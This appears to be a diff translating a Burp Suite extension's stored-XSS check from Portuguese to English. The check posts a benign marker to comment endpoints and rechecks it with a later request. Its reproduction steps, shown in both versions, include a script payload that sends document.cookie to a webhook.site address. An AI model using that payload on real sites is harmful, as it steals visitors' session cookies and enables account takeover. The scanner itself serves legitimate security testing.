@@ -11,86 +11,86 @@ import java.util.ArrayList;
 import java.util.List;
 
 /**
- * Testa XSS ARMAZENADO: envia um payload marcado com um ID único para
- * endpoints típicos de conteúdo gerado por usuário (comentário, feedback,
- * post de fórum/guestbook), e então busca esse marcador de volta em uma
- * SEGUNDA requisição (GET no mesmo endpoint e na home da aplicação) — ou
- * seja, confirma que o dado foi persistido e é servido sem sanitização
- * para QUALQUER visitante, não só para quem enviou.
+ * Tests for STORED XSS: sends a payload tagged with a unique ID to typical
+ * user-generated-content endpoints (comment, feedback, forum/guestbook post),
+ * then looks for that marker again in a SECOND request (GET on the same
+ * endpoint and on the application home page) — i.e. confirms the data was
+ * persisted and is served without sanitization to ANY visitor, not just the
+ * one who sent it.
  *
- * É mais significativo que o refletido: indica que o payload fica salvo
- * no banco e pode atingir outros usuários (inclusive admins) sem interação.
+ * This is more significant than reflected XSS: it indicates the payload is
+ * saved in the database and can reach other users (including admins) with no interaction.
  *
- * Criado por Rx0 - @rodrigocoutinho91
+ * Created by Rx0 - @rodrigocoutinho91
  */
 public class StoredXssCheck implements VulnCheck {
 
-    private static final String[] ENDPOINTS_DE_ESCRITA = {
+    private static final String[] WRITE_ENDPOINTS = {
             "/api/comments", "/api/v1/comments", "/comments",
             "/api/feedback", "/api/guestbook", "/api/posts", "/api/reviews"
     };
 
     @Override
-    public String nome() {
-        return "XSS armazenado (stored)";
+    public String name() {
+        return "Stored XSS";
     }
 
     @Override
-    public List<Finding> executar(MontoyaApi api, String baseUrl) {
-        List<Finding> achados = new ArrayList<>();
+    public List<Finding> execute(MontoyaApi api, String baseUrl) {
+        List<Finding> findings = new ArrayList<>();
         String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
 
-        for (String path : ENDPOINTS_DE_ESCRITA) {
+        for (String path : WRITE_ENDPOINTS) {
             try {
-                String marcador = "rx0stored" + (System.currentTimeMillis() % 1000000);
-                String payload = "<rx0xss>" + marcador + "</rx0xss>";
-                String corpo = "{\"comment\":\"" + payload + "\",\"message\":\"" + payload
+                String marker = "rx0stored" + (System.currentTimeMillis() % 1000000);
+                String payload = "<rx0xss>" + marker + "</rx0xss>";
+                String requestBody = "{\"comment\":\"" + payload + "\",\"message\":\"" + payload
                         + "\",\"name\":\"RxTest\",\"content\":\"" + payload + "\",\"text\":\"" + payload + "\"}";
 
-                HttpRequest reqEscrita = HttpRequest.httpRequestFromUrl(base + path)
+                HttpRequest writeReq = HttpRequest.httpRequestFromUrl(base + path)
                         .withMethod("POST")
                         .withAddedHeader("Content-Type", "application/json")
-                        .withBody(corpo);
-                HttpResponse respEscrita = api.http().sendRequest(reqEscrita).response();
-                if (respEscrita == null || respEscrita.statusCode() >= 400) continue;
+                        .withBody(requestBody);
+                HttpResponse writeResp = api.http().sendRequest(writeReq).response();
+                if (writeResp == null || writeResp.statusCode() >= 400) continue;
 
-                // Se o próprio POST já ecoa sem escaping, é pelo menos refletido —
-                // mas o que realmente importa aqui é a releitura em uma requisição NOVA.
-                boolean confirmadoNaRegravacao = buscarMarcadorEm(api, base + path, payload);
-                boolean confirmadoNaHome = buscarMarcadorEm(api, base + "/", payload);
+                // If the POST itself already echoes without escaping, it's at least reflected —
+                // but what really matters here is re-reading it in a NEW request.
+                boolean confirmedOnRewrite = findMarkerAt(api, base + path, payload);
+                boolean confirmedOnHome = findMarkerAt(api, base + "/", payload);
 
-                if (confirmadoNaRegravacao || confirmadoNaHome) {
-                    String ondeConfirmou = confirmadoNaRegravacao ? (base + path) : (base + "/");
-                    achados.add(new Finding(
-                            "Possível XSS armazenado (stored) via " + path,
-                            Severity.CRITICA,
-                            ondeConfirmou,
-                            "Um payload de teste foi enviado via POST para '" + path + "' e, em uma requisição GET SEPARADA e " +
-                                    "posterior, o mesmo payload voltou sem escaping — ou seja, o dado foi persistido e é servido " +
-                                    "para qualquer visitante da página sem sanitização. Isso é mais grave que XSS refletido, pois " +
-                                    "não depende de enganar a vítima a clicar em um link malicioso.",
-                            "Payload enviado: " + payload + " | Confirmado em: " + ondeConfirmou,
-                            "Sanitize/escape todo conteúdo gerado por usuário antes de armazenar OU antes de renderizar (idealmente " +
-                                    "as duas coisas), e implemente CSP como defesa em profundidade.",
-                            "1) Reenvie o mesmo POST para '" + base + path + "' trocando o payload de teste por um PoC real, ex: " +
-                                    "<script>fetch('https://webhook.site/SEU-ID?c='+document.cookie)</script> no campo de comentário/mensagem. " +
-                                    "2) Acesse '" + ondeConfirmou + "' com outra sessão/navegador (simulando outro usuário/admin visitando a página) " +
-                                    "e confirme que o script roda automaticamente, sem precisar de interação da vítima. 3) Isso demonstra que " +
-                                    "o payload atinge QUALQUER visitante — inclusive administradores, o que pode levar a takeover de conta."));
+                if (confirmedOnRewrite || confirmedOnHome) {
+                    String confirmedWhere = confirmedOnRewrite ? (base + path) : (base + "/");
+                    findings.add(new Finding(
+                            "Possible stored XSS via " + path,
+                            Severity.CRITICAL,
+                            confirmedWhere,
+                            "A test payload was sent via POST to '" + path + "' and, in a SEPARATE, later GET request, " +
+                                    "the same payload came back without escaping — i.e. the data was persisted and is served " +
+                                    "to any visitor of the page without sanitization. This is more severe than reflected XSS, since " +
+                                    "it does not depend on tricking the victim into clicking a malicious link.",
+                            "Payload sent: " + payload + " | Confirmed at: " + confirmedWhere,
+                            "Sanitize/escape all user-generated content before storing it OR before rendering it (ideally " +
+                                    "both), and implement CSP as defense in depth.",
+                            "1) Resend the same POST to '" + base + path + "' swapping the test payload for a real PoC, e.g.: " +
+                                    "<script>fetch('https://webhook.site/YOUR-ID?c='+document.cookie)</script> in the comment/message field. " +
+                                    "2) Access '" + confirmedWhere + "' with another session/browser (simulating another user/admin visiting the page) " +
+                                    "and confirm the script runs automatically, with no victim interaction required. 3) This demonstrates that " +
+                                    "the payload reaches ANY visitor — including administrators, which can lead to account takeover."));
                 }
             } catch (Exception e) {
-                api.logging().logToError("[Rx0] Erro no check de XSS armazenado (" + path + "): " + e.getMessage());
+                api.logging().logToError("[Rx0] Error in stored XSS check (" + path + "): " + e.getMessage());
             }
         }
-        return achados;
+        return findings;
     }
 
-    private boolean buscarMarcadorEm(MontoyaApi api, String url, String payload) {
+    private boolean findMarkerAt(MontoyaApi api, String url, String payload) {
         try {
-            HttpRequest reqLeitura = HttpRequest.httpRequestFromUrl(url);
-            HttpResponse respLeitura = api.http().sendRequest(reqLeitura).response();
-            if (respLeitura == null) return false;
-            String body = respLeitura.bodyToString();
+            HttpRequest readReq = HttpRequest.httpRequestFromUrl(url);
+            HttpResponse readResp = api.http().sendRequest(readReq).response();
+            if (readResp == null) return false;
+            String body = readResp.bodyToString();
             return body != null && body.contains(payload);
         } catch (Exception e) {
             return false;
